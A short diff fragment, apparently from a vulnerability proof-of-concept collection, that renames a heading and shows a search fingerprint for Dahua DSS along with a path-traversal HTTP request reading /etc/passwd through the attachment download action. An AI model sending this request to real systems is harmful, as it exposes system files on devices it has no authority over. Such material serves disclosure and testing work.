@@ -8,7 +8,7 @@
 app="dahua-DSS"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /portal/attachment_downloadAtt.action?filePath=../../../../../../etc/passwd HTTP/1.1
